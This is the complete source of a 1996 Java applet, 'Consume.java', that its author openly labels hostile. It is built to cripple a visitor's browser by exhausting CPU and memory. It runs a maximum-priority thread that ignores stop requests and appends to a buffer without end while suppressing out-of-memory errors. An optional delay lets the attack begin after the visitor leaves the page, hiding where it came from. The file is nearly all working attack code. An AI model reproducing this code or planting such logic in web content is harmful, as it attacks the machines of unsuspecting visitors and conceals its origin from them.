package hostile;
/* Consume.java by Mark D. LaDue */

/* February 18, 1996  */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to bring your Java-aware
   browser to its knees by hogging both the CPU and memory. */

import java.awt.Color;
import java.awt.Event;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;

public class Consume extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to our offscreen object
    Font wordFont = new Font("TimesRoman", Font.PLAIN, 12);

//  This thread will attempt to consume CPU resources
    Thread wasteResources = null;

//  An offscreen Image where all of the real action will occur
//    Image offscreenImage;

//  All of the tools necessary to handle the offscreen Image
//    Graphics offscreenGraphics;  // Needed to handle the offscreen Image

//  To avoid arrays and have open-ended storage of calculation results
    StringBuffer holdBigNumbers = new StringBuffer(0);

//  Used for the while loop in the run() method
    long n = 0;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds
    int delay;


/*  Set up a big blue rectangle in the browser and create an offscreen Image */

    public void init() {
    setBackground(Color.blue);
//    offscreenImage = createImage(this.size().width, this.size().height);
//    offscreenGraphics = offscreenImage.getGraphics();

//  Determine how many seconds the thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
    }

/*  Create and start the offending thread in the standard way */

    public void start() {
        if (wasteResources == null) {
        wasteResources = new Thread(this);
        wasteResources.setPriority(Thread.MAX_PRIORITY);
        wasteResources.start();
        }
    }

/*  We won't stop anything */

    public void stop() {}


/*  
    This method repeatedly appends a very large integer to
    a StringBuffer. It can sleep for a specified length 
    of time in order to give the browser enough
    time to go elsewhere before it insidious effects
    become apparent. */

    public void run() {
        try {Thread.sleep(delay);}
        catch (InterruptedException e) {}
        while (n >= 0) {
        try { holdBigNumbers.append(0x7fffffffffffffffL); }
        catch (OutOfMemoryError o) {}
        repaint();
        n++;
        }
    }

    public void update(Graphics g) {
        paint(g);
    }

/*  Paints to the offscreen Image */

    public void paint(Graphics g) {
//    offscreenGraphics.setColor(Color.white);
//    offscreenGraphics.drawRect(0, 0, this.size().width, this.size().height);
//    offscreenGraphics.setColor(Color.blue);
//    offscreenGraphics.drawString(holdBigNumbers.toString(), 10, 50);
    }
}
